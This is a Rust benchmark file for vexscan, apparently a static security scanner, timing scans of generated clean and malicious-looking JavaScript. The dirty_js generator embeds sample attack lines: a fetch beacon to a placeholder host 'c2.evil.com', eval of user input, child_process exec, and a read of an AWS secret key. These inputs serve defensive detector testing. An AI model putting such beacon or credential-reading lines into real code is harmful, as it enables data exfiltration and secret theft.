//! Performance benchmarks for vexscan.
//!
//! Run with: cargo bench
//! Results in: target/criterion/report/index.html

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion};
use std::path::Path;
use vexscan::{Config, RuleSet, StaticAnalyzer};

// ---------------------------------------------------------------------------
// Synthetic content generators
// ---------------------------------------------------------------------------

/// Generate a clean JS file of approximately `lines` lines (no findings).
fn clean_js(lines: usize) -> String {
    let mut s = String::with_capacity(lines * 60);
    s.push_str("'use strict';\n\n");
    for i in 0..lines {
        s.push_str(&format!(
            "const value_{i} = Math.floor(Math.random() * {i});\n"
        ));
    }
    s.push_str("\nmodule.exports = {};\n");
    s
}

/// Generate a JS file with malicious patterns scattered throughout.
fn dirty_js(lines: usize) -> String {
    let mut s = String::with_capacity(lines * 80);
    s.push_str("'use strict';\nconst os = require('os');\n\n");
    for i in 0..lines {
        if i % 50 == 0 {
            s.push_str("eval(userInput);\n");
        } else if i % 100 == 7 {
            s.push_str("require('child_process').exec(cmd);\n");
        } else if i % 100 == 23 {
            s.push_str("fetch('https://c2.evil.com/beacon').then(r => r.text());\n");
        } else if i % 100 == 41 {
            s.push_str("process.env.AWS_SECRET_ACCESS_KEY;\n");
        } else {
            s.push_str(&format!(
                "const val_{i} = Math.floor(Math.random() * {i});\n"
            ));
        }
    }
    s
}

/// Generate a clean Python file.
fn clean_py(lines: usize) -> String {
    let mut s = String::with_capacity(lines * 40);
    s.push_str("import os\nimport sys\n\n");
    for i in 0..lines {
        s.push_str(&format!("value_{i} = {i} * 2\n"));
    }
    s
}

/// Generate a clean Markdown file.
fn clean_md(lines: usize) -> String {
    let mut s = String::with_capacity(lines * 50);
    s.push_str("# Documentation\n\n");
    for i in 0..lines {
        s.push_str(&format!(
            "This is paragraph {i} with some documentation text.\n\n"
        ));
    }
    s
}

// ---------------------------------------------------------------------------
// Benchmarks: Static analysis (scan_content)
// ---------------------------------------------------------------------------

fn bench_scan_content(c: &mut Criterion) {
    let analyzer = StaticAnalyzer::new().unwrap();
    let path_js = Path::new("test.js");
    let path_py = Path::new("test.py");
    let path_md = Path::new("test.md");

    let mut group = c.benchmark_group("scan_content");

    // Clean files — measures overhead of scanning with no matches
    for size in [100, 500, 1000, 5000] {
        let content = clean_js(size);
        group.bench_with_input(
            BenchmarkId::new("clean_js", size),
            &content,
            |b, content| {
                b.iter(|| analyzer.scan_content(black_box(content), black_box(path_js)));
            },
        );
    }

    // Dirty JS — measures match extraction + finding creation
    for size in [100, 500, 1000, 5000] {
        let content = dirty_js(size);
        group.bench_with_input(
            BenchmarkId::new("dirty_js", size),
            &content,
            |b, content| {
                b.iter(|| analyzer.scan_content(black_box(content), black_box(path_js)));
            },
        );
    }

    // Different file types at 1000 lines
    let py_content = clean_py(1000);
    group.bench_function("clean_py_1000", |b| {
        b.iter(|| analyzer.scan_content(black_box(&py_content), black_box(path_py)));
    });

    let md_content = clean_md(1000);
    group.bench_function("clean_md_1000", |b| {
        b.iter(|| analyzer.scan_content(black_box(&md_content), black_box(path_md)));
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Benchmarks: Rule matching pre-filter (RegexSet)
// ---------------------------------------------------------------------------

fn bench_rule_matching(c: &mut Criterion) {
    let ruleset = RuleSet::new().with_builtin_rules().unwrap();

    let mut group = c.benchmark_group("rule_matching");

    // Clean content — RegexSet should short-circuit most rules
    let clean = clean_js(500);
    group.bench_function("clean_js_500", |b| {
        b.iter(|| ruleset.find_matches_for_extension(black_box(&clean), black_box("js")));
    });

    // Dirty content — RegexSet identifies hits, then extract positions
    let dirty = dirty_js(500);
    group.bench_function("dirty_js_500", |b| {
        b.iter(|| ruleset.find_matches_for_extension(black_box(&dirty), black_box("js")));
    });

    // Markdown — tests extension filtering (most rules don't apply)
    let md = clean_md(500);
    group.bench_function("clean_md_500", |b| {
        b.iter(|| ruleset.find_matches_for_extension(black_box(&md), black_box("md")));
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Benchmarks: Config skip path (GlobSet)
// ---------------------------------------------------------------------------

fn bench_skip_path(c: &mut Criterion) {
    let config = Config::with_defaults();

    let mut group = c.benchmark_group("should_skip_path");

    // Paths that should be skipped (glob match)
    let skip_paths = [
        "project/node_modules/.cache/something.json",
        "project/.git/objects/abc123",
        "project/CHANGELOG.md",
        "project/target/debug/build/something.d",
    ];
    for path_str in skip_paths {
        group.bench_with_input(
            BenchmarkId::new("skip", path_str.split('/').last().unwrap()),
            &Path::new(path_str),
            |b, path| {
                b.iter(|| config.should_skip_path(black_box(path)));
            },
        );
    }

    // Paths that should NOT be skipped (must check all patterns)
    let scan_paths = [
        "plugins/my-plugin/index.js",
        "src/utils/helper.py",
        "skills/dangerous-skill/run.sh",
    ];
    for path_str in scan_paths {
        group.bench_with_input(
            BenchmarkId::new("scan", path_str.split('/').last().unwrap()),
            &Path::new(path_str),
            |b, path| {
                b.iter(|| config.should_skip_path(black_box(path)));
            },
        );
    }

    group.finish();
}

// ---------------------------------------------------------------------------
// Benchmarks: Real test samples (end-to-end)
// ---------------------------------------------------------------------------

fn bench_real_samples(c: &mut Criterion) {
    let analyzer = StaticAnalyzer::new().unwrap();
    let samples_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/samples");

    if !samples_dir.exists() {
        return;
    }

    // Collect all sample files
    let files: Vec<(String, String)> = walkdir::WalkDir::new(&samples_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .filter_map(|e| {
            let path = e.path().to_path_buf();
            let content = std::fs::read_to_string(&path).ok()?;
            let name = path
                .strip_prefix(&samples_dir)
                .unwrap_or(&path)
                .to_string_lossy()
                .to_string();
            Some((name, content))
        })
        .collect();

    let mut group = c.benchmark_group("real_samples");

    // Benchmark scanning all samples together (throughput)
    let total_bytes: usize = files.iter().map(|(_, c)| c.len()).sum();
    group.throughput(criterion::Throughput::Bytes(total_bytes as u64));

    group.bench_function("all_samples", |b| {
        b.iter(|| {
            for (name, content) in &files {
                let _ext = Path::new(name)
                    .extension()
                    .and_then(|e| e.to_str())
                    .unwrap_or("");
                let path = samples_dir.join(name);
                let _ = analyzer.scan_content(black_box(content), black_box(&path));
            }
        });
    });

    // Individual sample categories
    for (name, content) in &files {
        let ext = Path::new(name)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");
        let path = samples_dir.join(name);
        let label = name.replace('/', "_").replace('\\', "_");

        group.bench_function(&label, |b| {
            b.iter(|| analyzer.scan_content(black_box(content), black_box(&path)));
        });
    }

    group.finish();
}

// ---------------------------------------------------------------------------

criterion_group!(
    benches,
    bench_scan_content,
    bench_rule_matching,
    bench_skip_path,
    bench_real_samples,
);
criterion_main!(benches);
